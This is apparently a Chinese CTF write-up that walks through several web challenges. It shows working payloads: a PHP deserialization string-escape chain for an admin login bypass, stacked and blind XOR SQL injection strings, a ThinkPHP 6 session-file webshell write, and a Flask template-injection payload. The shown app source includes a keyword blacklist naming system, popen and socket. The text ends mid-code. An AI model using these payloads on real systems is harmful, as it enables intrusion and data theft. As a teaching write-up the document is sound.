title="题目分析"></a>题目分析</h4><p>扫描目录发现：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404184917405.png" alt="image-20210404184917405"></p><p>存在备份文件，下载代码审计：</p><p>admin 进入update页面 可得到flag</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404185032670.png" alt="image-20210404185032670"></p><p>查看是否存在注入：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404185139780.png" alt="image-20210404185139780"></p><p>存在预处理，因此无法注入</p><p>查询的sql语句为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,password from user where username&#x3D;?</span><br></pre></td></tr></table></figure><p>查询admin用户的密码，密码和数据库相等则登陆成功。</p><p>通过控制执行的语句即可绕过登录admin：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select id,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?  </span><br><span class="line">&#x2F;&#x2F;&quot;202cb962ac59075b964b07152d234b70&quot;为123的MD5，密码输入123即可</span><br></pre></td></tr></table></figure><p>接下来就是利用反序列化漏洞，构造pop链去执行sql语句：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404190050208.png" alt="image-20210404190050208"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UpdateHelper类在结束时 会echo 调用魔术方法</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404190403536.png" alt="image-20210404190403536"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">触发User的__toString()方法</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404190518655.png" alt="image-20210404190518655"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">调用Info的__call()方法</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404191205555.png" alt="image-20210404191205555"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__call 方法调用了login</span><br></pre></td></tr></table></figure><p>这里可以：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;CtrlCase 为dbCtrl类</span><br><span class="line">login参数为：$this-&gt;age传进来的</span><br></pre></td></tr></table></figure><p>pop 链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UpdateHelper::__destruct()-&gt;User::__toString()-&gt;Info::__call-&gt;dbCtrl::login</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404194116259.png" alt="image-20210404194116259"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>寻找反序列化入口：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404195102818.png" alt="image-20210404195102818"></p><p>update页面会调用update方法：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404194612300.png" alt="image-20210404194612300"></p><p>可见<code>$_POST[&#39;age&#39;]</code>与<code>$_POST[&#39;nickname&#39;]</code>可控，传入Info类实例化，然后反序列化，再经过safe函数处理。</p><p>可见如果我们直接传入payload，那么payload不会被识别为对象，而是字符串，但是这里我们看到了典型的反序列化字符串逃逸的形式，可以利用字符串逃逸：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404211512856.png" alt="image-20210404211512856"></p><p>可见是一个字符增加的字符串逃逸。</p><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>Info()类正常序列化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:7:&quot;testage&quot;;s:8:&quot;nickname&quot;;s:8:&quot;testname&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>当把我们把payload作为nickname值传进去，为了拼接闭合，对payload改一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>即把payload当做Info()类正常序列化的N值，最后加}闭合，序列化之后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:265:&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>可见要让我们的payload逃逸出来，必须多出265个字符，一个字符用一个union 替换为hacker，可见需要265个union，即nickname为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>序列化一下并用safe函数处理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:1590:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404211056046.png" alt="image-20210404211056046"></p><p>可见可以逃逸出来，因此payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">age&#x3D;1&amp;nickname&#x3D;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404211250655.png" alt="image-20210404211250655"></p><p>登录页面 用户名admin 密码任意：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404211322225.png" alt="image-20210404211322225"></p><h3 id="WEB-Blacklist"><a href="#WEB-Blacklist" class="headerlink" title="[WEB]Blacklist"></a>[WEB]Blacklist</h3><h4 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h4><p>首先查询，发现和强网杯的很像</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404124133764.png" alt="image-20210404124133764"></p><p>因此尝试堆叠注入，过滤字符：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404124229017.png" alt="image-20210404124229017"></p><p>因此无法改名，也无法用预处理语句。</p><p>通过查资料 发现可以利用<code>handler</code>语句</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404130143408.png" alt="image-20210404130143408"></p><p>可见flag在<code>FlagHere</code>表</p><h4 id="Getflag"><a href="#Getflag" class="headerlink" title="Getflag"></a>Getflag</h4><p>构造语句查一下第一行数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。</span><br><span class="line"> 通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。</span><br><span class="line"> 通过HANDLER tbl_name CLOSE来关闭打开的句柄。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;handler &#96;FlagHere&#96; open;handler &#96;FlagHere&#96; read first;handler &#96;FlagHere&#96; close;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404130502802.png" alt="image-20210404130502802"></p><p>直接查到了flag。</p><h3 id="WEB-Ezsqli"><a href="#WEB-Ezsqli" class="headerlink" title="[WEB]Ezsqli"></a>[WEB]Ezsqli</h3><h4 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h4><p>sql注入题目，通过测试发现是整数型注入，过滤的函数比较多， 利用burpsuit-fuzz过滤的函数：</p><p>发现and、or等函数都过滤了：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404135430569.png" alt="image-20210404135430569"></p><p>发现<code>^</code>没有过滤，采用<code>^</code>测试注入点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1^0%23</span><br><span class="line">id&#x3D;1^1%23</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404135535230.png" alt="image-20210404135535230"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404135616538.png" alt="image-20210404135616538"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404135712369.png" alt="image-20210404135712369"></p><p>返回错误</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404135756770.png" alt="image-20210404135756770"></p><p>返回正确。</p><p>发现存在注入。</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404140526716.png" alt="image-20210404140526716"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404140614551.png" alt="image-20210404140614551"></p><p>接下来就构造注入语句，因为过滤了or，所以无法使用<code>information_schema</code></p><p>绕过函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sys.schema_auto_increment_columns</span><br><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">sys.x$schema_table_statistics_with_buffer</span><br><span class="line">sys.x$schema_flattened_keys</span><br><span class="line">join无列名注入</span><br></pre></td></tr></table></figure><p>构造查表语句：</p><p>判断逻辑：返回Nu1L说明payload为1对，语句成立</p><p>返回Error Occured When Fetch Result payload为0，语句不成立</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查表名：</span><br><span class="line">id&#x3D;1^(ascii(substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema&#x3D;database()),&#123;&#125;,1))&#x3D;&#123;&#125;)^1</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404152201048.png" alt="image-20210404152201048"></p><p>可见表名：f1ag_1s_h3r3_hhhhh</p><p>下面用无列名注入，利用到了ascii位偏移：</p><p>两个字符串比较时利用首字符的ascii码</p><p>核心payload：<code>(select &#39;admin&#39;,&#39;admin&#39;)&gt;(select * from users limit 1)</code></p><p>//子查询之间也可以直接通过<code>&gt;、&lt;、=</code>来进行判断。</p><p>测试字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select 1</span><br><span class="line">select 1,2</span><br><span class="line">select 1,2,3</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160620528.png" alt="image-20210404160620528"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160633320.png" alt="image-20210404160633320"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160645953.png" alt="image-20210404160645953"></p><p>构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1^((select 1,&#39;f&#39;)&gt;(select * from f1ag_1s_h3r3_hhhhh))^1</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160225767.png" alt="image-20210404160225767"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160241590.png" alt="image-20210404160241590"></p><p>可见<code>Nu1L</code>页面的上一位就是我们要查询的值.</p><h4 id="Getflag-1"><a href="#Getflag-1" class="headerlink" title="Getflag"></a>Getflag</h4><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160710227.png" alt="image-20210404160710227"></p><p>成功查询到flag。</p><h3 id="WEB-EasyThinking"><a href="#WEB-EasyThinking" class="headerlink" title="[WEB]EasyThinking"></a>[WEB]EasyThinking</h3><h4 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h4><p>题目存在注册，登录，搜索功能，注册后登录搜索测试，发现个人中心会显示搜索记录。根据首页信息：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419105854.png" alt="image-20210419105853980"></p><p>猜测搜索处存在利用点。扫描目录发现存在<code>www.zip</code>，下载源码审计，发现是TP框架，找到功能点核心代码：发现search 处session存储，同时TP是6.0版本：</p><p>参考：<a href="https://paper.seebug.org/1114/">https://paper.seebug.org/1114/</a></p><p>参考：<a href="https://xz.aliyun.com/t/8409">https://xz.aliyun.com/t/8409</a></p><p>TP6session文件存储存在的任意文件操作漏洞，我们可以写入shell，文件路径<code>\runtime\session</code>，文件名为32位就可以，构造后缀为<code>.php</code>的32位字符串，访问<code>sess_</code>+文件名</p><h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>从注册的时候开始修改：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419140614.png" alt="image-20210419140614233"></p><p>注册后<code>search</code> 页面 提交key，先写入<code>&lt;?php phpinfo();?&gt;</code></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419141031.png" alt="image-20210419141030952"></p><p>然后访问看下：<code>http://xx/runtime/session/sess_b1d19886ab14c0d8340ddf637c17.php</code></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419141426.png" alt="image-20210419141426271"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419142246.png" alt="image-20210419142246746"></p><p>写入一句话，蚁剑连接发现执行不了命令，看下phpinfo：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419141512.png" alt="image-20210419141512122"></p><p>发现需要bypass disable_functions，php版本为7.3，直接利用蚁剑插件 php7-Backtrace-UAF bypass:</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419145536.png" alt="image-20210419145536851"></p><h3 id="WEB-FlaskApp"><a href="#WEB-FlaskApp" class="headerlink" title="[WEB]FlaskApp"></a>[WEB]FlaskApp</h3><h4 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h4><p>根据题目提示是个flask的base64加密、解密程序，加密结果会在首页显示，还存在一个hint页面：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419150702.png" alt="image-20210419150702201"></p><p>查看源码发现提示<code>PIN</code> 猜测可能是Flask debug Pin码攻击，现在重点就是结合其他漏洞获取必要信息，通过反复测试发现解密的时候输入非base64，识别不了就会报错，同时可以查看部分源码：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419151659.png" alt="image-20210419151659872"></p><p>可以看到如果输入的值解密后能够绕过waf，那么就会执行。那么现在的思路就是构造payload然后base64加密，之后解密执行。</p><h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>采用if条件语句防止被过滤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;</span><br><span class="line">&#123;&#123; </span><br><span class="line">c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;, &#39;r&#39;).read()</span><br><span class="line">&#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX0NCnslIGlmIGMuX19uYW1lX189PSdjYXRjaF93YXJuaW5ncycgJX0NCnt7IA0KYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignYXBwLnB5JywgJ3InKS5yZWFkKCkNCn19DQp7JSBlbmRpZiAlfQ0KeyUgZW5kZm9yICV9</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419154846.png" alt="image-20210419154846170"></p><p>可以得到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template_string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template,request,flash,redirect,url_for</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;s_e_c_r_e_t_k_e_y&#x27;</span></span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameForm</span>(<span class="params">FlaskForm</span>):</span></span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64加密&#x27;</span>,validators= [DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;提交&#x27;</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameForm1</span>(<span class="params">FlaskForm</span>):</span></span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64解密&#x27;</span>,validators= [DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;提交&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    black_list = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;import&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;chr&quot;</span>,<span class="string">&quot;request&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;subprocess&quot;</span>,<span class="string">&quot;commands&quot;</span>,<span class="string">&quot;socket&quot;</span>,<span class="string">&quot;hex&quot;</span>,<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list :</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower() :</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hint</span>():</span></span><br><span class="line">    txt = <span class="string">&quot;失败乃成功之母！！&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;hint.html&quot;</span>,txt = txt)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64encode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果  :&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(text_decode.decode()))</span><br><span class="line">        res =  render_template_string(tmp)</span><br><span class="line">        flash(tmp)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;encode&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        text = <span class="string">&quot;&quot;</span></span><br><span class="line">        form = NameForm(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,form = form ,method = <span class="string">&quot;加密&quot;</span> ,img = <span class="string">&quot;flask.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span 